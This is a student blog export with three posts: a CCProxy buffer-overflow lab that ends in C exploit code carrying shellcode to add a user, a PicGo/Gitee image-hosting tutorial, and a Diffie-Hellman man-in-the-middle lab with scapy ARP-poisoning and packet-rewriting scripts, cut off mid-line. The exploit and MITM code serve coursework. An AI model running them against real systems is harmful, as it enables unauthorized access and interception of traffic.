<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;MSWSock.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;Ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WIN32_LEAN_AND_MEAN</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_LEN 2000</span></span><br><span class="line"><span class="keyword">char</span> shell[] =<span class="string">&quot;\x55\x8b\xec\x33\xff\x57\x83\xec &quot;</span></span><br><span class="line">              <span class="string">&quot;\x0c\xc6\x45\xf0\x6e\xc6\x45\xf1 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x65\xc6\x45\xf2\x74\xc6\x45\xf3 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x20\xc6\x45\xf4\x75\xc6\x45\xf5 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x73\xc6\x45\xf6\x65\xc6\x45\xf7 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x72\xc6 x45\xf8\x20\xc6\x45\xf9 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x61\xc6 x45\xfa\x20\xc6\x45\xfb &quot;</span></span><br><span class="line">              <span class="string">&quot;\x2f\xc6\x45\xfc\x61\xc6\x45\xfd &quot;</span></span><br><span class="line">              <span class="string">&quot;\x64\xc6\x45\xfe\x64\x8d\x45\xf0 &quot;</span></span><br><span class="line">              <span class="string">&quot;\x50\xb8\xc7\x93\xbf\x77\xff\xd0 &quot;</span>;<span class="comment">//shellcode机器码</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WSADATA ws;<span class="comment">//初始化ws</span></span><br><span class="line">    <span class="keyword">int</span> ret = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;ws);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sa</span>;</span></span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(<span class="number">23</span>);</span><br><span class="line">    sa.sin_addr.s_addr = inet_addr(<span class="string">&quot;127.0.0.1&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[MAX_LEN];</span><br><span class="line">    <span class="keyword">char</span> buf1[<span class="number">1024</span>];</span><br><span class="line">    buf[<span class="number">0</span>] = <span class="string">&#x27;p&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="string">&#x27;i&#x27;</span>;</span><br><span class="line">    buf[<span class="number">2</span>] = <span class="string">&#x27;n&#x27;</span>;</span><br><span class="line">    buf[<span class="number">3</span>] = <span class="string">&#x27;g&#x27;</span>;</span><br><span class="line">    buf[<span class="number">4</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">    <span class="keyword">int</span> l = <span class="built_in">strlen</span>(shell);</span><br><span class="line">    buf[<span class="number">5</span>] = buf[<span class="number">6</span>] = buf[<span class="number">7</span>] = buf[<span class="number">8</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">//前4个字节为无用字节</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">9</span>; j &lt; <span class="number">9</span> + l; j++)</span><br><span class="line">        buf[j] = shell[j - <span class="number">9</span>];</span><br><span class="line">    <span class="comment">//插入shellcode</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">9</span> + l; i &lt; <span class="number">1012</span> + <span class="number">5</span>; i++)</span><br><span class="line">        buf[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="comment">//到溢出点为止都填入无用字节</span></span><br><span class="line">    buf[<span class="number">1017</span>] = <span class="number">0x6E</span>;</span><br><span class="line">    buf[<span class="number">1018</span>] = <span class="number">0x4C</span>;</span><br><span class="line">    buf[<span class="number">1019</span>] = <span class="number">0x51</span>;</span><br><span class="line">    buf[<span class="number">1020</span>] = <span class="number">0x00</span>;</span><br><span class="line">    <span class="comment">//这里为JMP ESP的地址，00514C6E</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1021</span>; i &lt; <span class="number">1998</span>; i++)</span><br><span class="line">        buf[i] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1998</span>] = <span class="string">&#x27;\r&#x27;</span>;</span><br><span class="line">    buf[<span class="number">1999</span>] = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    <span class="comment">//命令结束回车换行</span></span><br><span class="line">    <span class="comment">//创建Socket</span></span><br><span class="line">    SOCKET sc = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//连接到服务器</span></span><br><span class="line">    ret = connect(sc, (<span class="keyword">const</span> sockaddr*)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    recv(sc, buf1, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//接收服务器端的回答</span></span><br><span class="line">    ret = send(sc, buf, <span class="number">2000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//发送攻击数据</span></span><br><span class="line">    closesocket(sc);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后运行CCproxy，再次执行上面的代码会发现CCProxy发生了溢出崩溃，理论上来说，代码成功执行会在系统中添加一个名为a的用户，在CMD窗口下利用net user指令查看用户状况可以发现已经成功添加，shellcode正确执行。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220545.png" alt="用户添加成功"  /></p>
<p>至此，利用简单的溢出漏洞来实现添加用户的功能已经完成。</p>
<hr>
<div class="note pink icon simple"><i class="note-icon fas fa-car-crash"></i><p><strong>$ps:$这是软件安全第二次实验的内容，最近的病毒实验实在太烧脑，希望后续能将这一部分完整记录下来！</strong></p>
</div>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/05AE3B62.gif" alt="img"></p>
]]></content>
      <categories>
        <category>网络攻防</category>
        <category>软件安全</category>
      </categories>
      <tags>
        <tag>网络攻防</tag>
        <tag>软件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>PicGo + Gitee 搭建免费图床</title>
    <url>/2021/04/09/PicGo-Gitee-%E6%90%AD%E5%BB%BA%E5%85%8D%E8%B4%B9%E5%9B%BE%E5%BA%8A/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>搭建好自己的博客之后，非常激动啊！！！迫不及待的想写一篇文章来试试水，在往博客中插入图片时遇到了一个很大的问题：图片路径哪里来？由于搭建的是静态博客，如果将图片存放在本地硬盘空间内，网络端访问必然会产生无法获取图片的问题！玛莎卡？将图片存放在主题的 /source/img 文件夹下再在使用时使用相对路径？</p>
<p>细思极恐啊！当图片数量众多，项目文件必然臃肿，部署到云端也就更加慢了。在网上查找解决方法时发现可以搭建 <strong><em>图床</em></strong>  ，顾名思义就是云端用于存储图片的服务器吧，网上现在主流图床有SM.MS、腾讯云COS、Github图床、七牛、阿里云等，当然免费的图床主推Github和Gitee了，但是Github在国外时不时无法连接，而且速度肯定没有国内的码云快了，当然使用阿里云和腾讯云那些就不比了（白嫖真香！）。所以这里就采用了 <u><strong><em>Gitee + PicGo</em></strong></u> 搭建自己的图床。</p>
<p>注：使用码云搭建的图床具有对图片大小的限制，超过1MB大小的图片需要登录才能进行显示，因此这里提供一个用于压缩图片的网站：</p>
<p><strong><em><a href="https://tinypng.com/">TingPNG:<u>压缩图片</u></a></em></strong></p>
<h2 id="合成材料"><a href="#合成材料" class="headerlink" title="合成材料"></a>合成材料</h2><div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:left">码云（Gitee）账号，没有的可以创建</th>
<th><a href="https://gitee.com/">https://gitee.com/</a></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">PicGo软件</td>
<td><a href="https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0-beta.5">https://github.com/Molunerfinn/PicGo/releases/tag/v2.3.0-beta.5</a></td>
</tr>
</tbody>
</table>
</div>
<p>注：<a href="https://github.com/Molunerfinn/PicGo">PicGo开源项目地址，可以查看使用文档</a></p>
<h2 id="Gitee准备"><a href="#Gitee准备" class="headerlink" title="Gitee准备"></a>Gitee准备</h2><p>类似于Github，先创建一个仓库，这里姑且命名为images，在该仓库中创建一个文件夹用于存放图片（也可以不创建），这里使用img作为文件夹名称。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409203754.png" alt="alt 示例"></p>
<p>创建仓库时需要添加开源许可证啥的，跟着走就行，记得“是否开源”选择“公开”。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409204152.png" alt="alt acejha"></p>
<p>这些结束后，需要创建一个token，下面会用到这个私人令牌，具体方法为：“个人主页→个人设置→私人令牌→生成新令牌”，添加描述后默认勾选提交即可，复制到剪贴板备用。在私人令牌管理界面可以对令牌进行删除、修改和重新生成等操作。</p>
<h2 id="PicGo配置"><a href="#PicGo配置" class="headerlink" title="PicGo配置"></a>PicGo配置</h2><p>安装好对应系统的PicGO后，在插件设置中找到Gitee-uploader插件安装，注意安装后重启软件。在正确安装的情况下，重启应用打开图床设置可以找到gitee选项。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409205044.png" alt="alt jhhg"></p>
<p>gitee设置界面，相关参数如下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">repo</th>
<th style="text-align:center">【必需】仓库名，见上文图片注释</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">master</td>
<td style="text-align:center">【可选】默认master</td>
</tr>
<tr>
<td style="text-align:center">token</td>
<td style="text-align:center">【必需】上文中生成的令牌</td>
</tr>
<tr>
<td style="text-align:center">path</td>
<td style="text-align:center">【可选】如果上文创建的话，可填img；反之可不填</td>
</tr>
<tr>
<td style="text-align:center">customPath和customUrl</td>
<td style="text-align:center">无需配置</td>
</tr>
</tbody>
</table>
</div>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210409205324.png" alt="alt shiji"></p>
<p>点击确定和设为默认图床即可。</p>
<h2 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h2><p>在上传区，可以选择拖拽上传，也可以点击剪贴板上传直接将截图上传，上传成功的话会有系统消息提醒。同时，在下方可以选择返回值的格式，返回值会在剪贴板中保留，在编写文档时直接粘贴即可。相册中可以查看已经上传的图片，香的一批啊有木有！</p>
<p>最后附上一个我个人经常选择图片的网站：<a href="https://beta.bz.zzzmh.cn/index">极简壁纸</a></p>
<p>参考：<a href="https://github.com/Molunerfinn/PicGo">https://github.com/Molunerfinn/PicGo</a></p>
]]></content>
      <categories>
        <category>Gitee</category>
      </categories>
      <tags>
        <tag>Gitee</tag>
        <tag>教程</tag>
        <tag>图床</tag>
      </tags>
  </entry>
  <entry>
    <title>基于DH密钥协商的中间人攻击</title>
    <url>/2021/06/19/%E5%9F%BA%E4%BA%8EDH%E5%AF%86%E9%92%A5%E5%8D%8F%E5%95%86%E7%9A%84%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<hr>
<h1 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h1><p>先来张图介绍一下$Diffie-Hellman$算法的基本原理，当然，这里使用的是教科书上的DH交换算法，在实际应用中并不会如此简单。</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210619203314.png" alt="alt DH交换算法"></p>
<p>基于之前学过的西南数学中的基本原理，$Alice$与$Bob$之间共享的是大素数$p$与对应乘法群$Z_p^*$的一个本原元$g$，$Alice$向$Bob$发送自己的$A=g^a$，同时$Bob$向$Alice$发送自己的$B=g^b$，这样二者都可以计算出密钥$K=g^{ab}\ mod \ p$,对应的破解难题是离散对数问题。</p>
<hr>
<h1 id="简单DH交换的实现"><a href="#简单DH交换的实现" class="headerlink" title="简单DH交换的实现"></a>简单DH交换的实现</h1><h2 id="设计报文格式"><a href="#设计报文格式" class="headerlink" title="设计报文格式"></a>设计报文格式</h2><p>这里简单的设计报文格式为：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">字段</th>
<th style="text-align:center">标志位flag​</th>
<th style="text-align:center">p的位数len_p</th>
<th style="text-align:center">p</th>
<th style="text-align:center">g的位数len_g</th>
<th style="text-align:center">g</th>
<th style="text-align:center">计算数（如A)</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">长度</td>
<td style="text-align:center">1</td>
<td style="text-align:center">1</td>
<td style="text-align:center">len_p</td>
<td style="text-align:center">1</td>
<td style="text-align:center">len_g</td>
<td style="text-align:center">不定</td>
</tr>
</tbody>
</table>
</div>
<p>在下面的代码中，由字符串的长度减去$flag、p、g$等可以计算出计算数的位数，数据包基于UDP协议进行实现。这里由$HostA$主机扮演$Alice$，由$Server2$主机扮演$Bob$，而由$HostM$主机扮演接下来任务中的中间人，相关主机的$IP$地址及$MAC$地址见下表：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th style="text-align:center">主机名</th>
<th style="text-align:center">HostA</th>
<th style="text-align:center">HostM</th>
<th style="text-align:center">Server2</th>
<th style="text-align:center">网关</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">IP地址</td>
<td style="text-align:center">192.168.60.2</td>
<td style="text-align:center">192.168.60.3</td>
<td style="text-align:center">10.0.2.7</td>
<td style="text-align:center">192.168.60.1</td>
</tr>
<tr>
<td style="text-align:center">MAC地址</td>
<td style="text-align:center">02:42:c0:a8:3c:02</td>
<td style="text-align:center">02:42:c0:a8:3c:03</td>
<td style="text-align:center">02:42:0a:00:02:07</td>
<td style="text-align:center">02:42:90:9b:17:90</td>
</tr>
</tbody>
</table>
</div>
<h2 id="HostA-与-Server2-的DH通信实现"><a href="#HostA-与-Server2-的DH通信实现" class="headerlink" title="$HostA$与$Server2$的DH通信实现"></a>$HostA$与$Server2$的DH通信实现</h2><p>代码如下($HostA$为$client$端，$Server2$为$Server$端):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Client端</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  udp_client=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">  len_p=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input Length of P:&quot;</span>))</span><br><span class="line">  len_g=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input Length of g:&quot;</span>))</span><br><span class="line">  p=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input the P:&quot;</span>))</span><br><span class="line">  g=<span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Please input the g:&quot;</span>))</span><br><span class="line">  A=<span class="number">101</span></span><br><span class="line">  Ya=get_cal(g,A,p)</span><br><span class="line">  msg=<span class="string">&quot;0&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Ya)</span><br><span class="line">  udp_client.sendto(msg.encode(<span class="string">&#x27;utf-8&#x27;</span>),(<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line">  key=<span class="number">0</span></span><br><span class="line">  data,addr = udp_client.recvfrom(<span class="number">1024</span>)</span><br><span class="line">  <span class="built_in">print</span>(data)</span><br><span class="line">  <span class="built_in">print</span>(addr)</span><br><span class="line">  <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">&#x27;1&#x27;</span> :</span><br><span class="line">         Yb_str=<span class="string">&quot;&quot;</span></span><br><span class="line">         len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">             Yb_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         Yb=<span class="built_in">int</span>(Yb_str)</span><br><span class="line">         Key=get_key(Yb,A,p)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The Key is %d &quot;</span>,Key)</span><br><span class="line">  <span class="keyword">else</span> :</span><br><span class="line">         udp_client.sendto(msg,(<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Server端</span></span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">   udp_srv=socket(AF_INET,SOCK_DGRAM)</span><br><span class="line">   udp_srv.bind((<span class="string">&#x27;10.0.2.7&#x27;</span>,<span class="number">9010</span>))</span><br><span class="line">   B=<span class="number">89</span></span><br><span class="line">   p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   Ya_str=<span class="string">&quot;&quot;</span></span><br><span class="line">   data,addr=udp_srv.recvfrom(<span class="number">1024</span>)</span><br><span class="line">   <span class="built_in">print</span>(data)</span><br><span class="line">   <span class="built_in">print</span>(addr)</span><br><span class="line">   <span class="keyword">if</span> data[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">         len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">             p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         p=<span class="built_in">int</span>(p_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received P is %d&quot;</span>,p)</span><br><span class="line">         len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">             g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         g=<span class="built_in">int</span>(g_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received g is %d&quot;</span>,g)</span><br><span class="line">         len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">         <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">             Ya_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">         Ya=<span class="built_in">int</span>(Ya_str)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The received Ya is %d&quot;</span>,Ya)</span><br><span class="line">         Yb=get_cal(g,B,p)</span><br><span class="line">         msg=<span class="string">&quot;1&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span class="built_in">str</span>(len_g)+<span class="built_in">str</span>(g)+<span class="built_in">str</span>(Yb)</span><br><span class="line">         udp_srv.sendto(msg,addr)</span><br><span class="line">         Key=get_key(Ya,B,p)</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;The key is : %d&quot;</span>,Key)</span><br><span class="line">   <span class="keyword">else</span> :</span><br><span class="line">         msg=<span class="string">&quot;Error!&quot;</span></span><br><span class="line">         udp_srv.sendto(msg,addr)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>相关的过程及解释见下面的实验截图：</p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210618002652.png" alt="alt 1"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210618002823.png" alt="alt 2"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619152958.png" alt="alt 3"></p>
<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/QQ%E6%88%AA%E5%9B%BE20210619153112.png" alt="alt 4"></p>
<hr>
<h1 id="HostM-介入中间人进行攻击"><a href="#HostM-介入中间人进行攻击" class="headerlink" title="$HostM$介入中间人进行攻击"></a>$HostM$介入中间人进行攻击</h1><p>基于上次实验中的$ARP$缓存攻击，先造成$Alice$和$Bob$的$ARP$中毒，使得他们发送的包都会被$HostM$进行拦截并对内容加以修改后再发送包出去即可，$ARP$缓存中毒的代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#ARP缓存中毒攻击</span></span><br><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine A&#x27;s informaton</span></span><br><span class="line">IP_A  = <span class="string">&quot;192.168.60.2&quot;</span></span><br><span class="line">MAC_A = <span class="string">&quot;02:42:c0:a8:3c:02&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine B&#x27;s informaton</span></span><br><span class="line">IP_B  = <span class="string">&quot;192.168.60.1&quot;</span></span><br><span class="line">MAC_B = <span class="string">&quot;02:42:90:9b:17:90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attacker Machine&#x27;s informaton</span></span><br><span class="line">IP_M  = <span class="string">&quot;192.168.60.3&quot;</span></span><br><span class="line">MAC_M = <span class="string">&quot;02:42:c0:a8:3c:03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;SENDING SPOOFED ARP REPLY.........&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct spoofed ARP sent to machine A</span></span><br><span class="line">ether1     = Ether()</span><br><span class="line">ether1.dst = MAC_A</span><br><span class="line">arp1       = ARP()</span><br><span class="line">arp1.psrc  = IP_B</span><br><span class="line">arp1.hwsrc = MAC_M</span><br><span class="line">arp1.pdst  = IP_A</span><br><span class="line">arp1.op    = <span class="number">1</span> </span><br><span class="line">frame1     = ether1/arp1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Construct spoofed ARP sent to machine B</span></span><br><span class="line">ether2      = Ether()</span><br><span class="line">ether2.dst  = MAC_B</span><br><span class="line">arp2        = ARP()</span><br><span class="line">arp2.psrc   = IP_A</span><br><span class="line">arp2.hwsrc  = MAC_M</span><br><span class="line">arp2.pdst   = IP_B</span><br><span class="line">arp2.op     = <span class="number">1</span> </span><br><span class="line">frame2      = ether2/arp2</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">   sendp(frame1) </span><br><span class="line">   sendp(frame2) </span><br><span class="line">   sleep(<span class="number">5</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>$ARP\ $缓存中毒攻击是持续的，在攻击的过程中需要将$HostM\ $上的$IP$转发关闭，再运行嗅探并修改报文的代码，这一部分代码基于上一次实验中对$Netcat$攻击的代码，在其基础上进行修改即可：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine A&#x27;s informaton</span></span><br><span class="line">IP_A  = <span class="string">&quot;192.168.60.2&quot;</span></span><br><span class="line">MAC_A = <span class="string">&quot;02:42:c0:a8:3c:02&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Machine B&#x27;s informaton</span></span><br><span class="line"><span class="comment"># treat Gateway as Machine B</span></span><br><span class="line">IP_B  = <span class="string">&quot;192.168.60.1&quot;</span></span><br><span class="line">MAC_B = <span class="string">&quot;02:42:90:9b:17:90&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Server2&#x27;s information</span></span><br><span class="line">IP_Server2 = <span class="string">&quot;10.0.2.7&quot;</span></span><br><span class="line">MAC_Server2 = <span class="string">&quot;02:42:0a:00:02:07&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Attacker Machine&#x27;s informaton</span></span><br><span class="line">IP_M  = <span class="string">&quot;192.168.60.3&quot;</span></span><br><span class="line">MAC_M = <span class="string">&quot;02:42:c0:a8:3c:03&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cal</span>(<span class="params">a,rand,p</span>):</span></span><br><span class="line">    cal = (a**rand) % p</span><br><span class="line">    <span class="keyword">return</span> cal</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_key</span>(<span class="params">di,mi,p</span>):</span></span><br><span class="line">    key = (di ** mi ) % p</span><br><span class="line">    <span class="keyword">return</span> key</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">spoof_pkt</span>(<span class="params">pkt</span>):</span></span><br><span class="line">    s=<span class="number">53</span></span><br><span class="line">    t=<span class="number">67</span></span><br><span class="line">    <span class="keyword">if</span> pkt.haslayer(IP):</span><br><span class="line">        <span class="keyword">if</span> pkt.src == MAC_A <span class="keyword">and</span> pkt.dst == MAC_M:</span><br><span class="line">            pkt.src = MAC_M</span><br><span class="line">            pkt.dst = MAC_B</span><br><span class="line">            <span class="keyword">del</span> pkt[IP].chksum</span><br><span class="line">            <span class="keyword">del</span> pkt[UDP].chksum</span><br><span class="line">            <span class="keyword">if</span> pkt.haslayer(UDP) <span class="keyword">and</span> pkt[UDP].payload:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Packet is from A&quot;</span>)</span><br><span class="line">                p_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                g_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                Ya_str=<span class="string">&quot;&quot;</span></span><br><span class="line">                data = pkt[UDP].payload.load</span><br><span class="line">                len_p=<span class="built_in">int</span>(data[<span class="number">1</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,len_p+<span class="number">2</span>):</span><br><span class="line">                      p_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                p=<span class="built_in">int</span>(p_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received P is :&quot;</span>,p)</span><br><span class="line">                len_g=<span class="built_in">int</span>(data[len_p+<span class="number">2</span>])</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+<span class="number">3</span>,len_p+len_g+<span class="number">3</span>):</span><br><span class="line">                      g_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                g=<span class="built_in">int</span>(g_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received g is :&quot;</span>,g)</span><br><span class="line">                len_msg=<span class="built_in">len</span>(data)</span><br><span class="line">                <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(len_p+len_g+<span class="number">3</span>,len_msg):</span><br><span class="line">                      Ya_str+=<span class="built_in">str</span>(data[i])</span><br><span class="line">                Ya=<span class="built_in">int</span>(Ya_str)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The received Ya is :&quot;</span>,Ya)</span><br><span class="line">                Yt=get_cal(g,t,p)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;The Yt with B is:&quot;</span>,Yt)</span><br><span class="line">                newdata=<span class="string">&quot;0&quot;</span>+<span class="built_in">str</span>(len_p)+<span class="built_in">str</span>(p)+<span 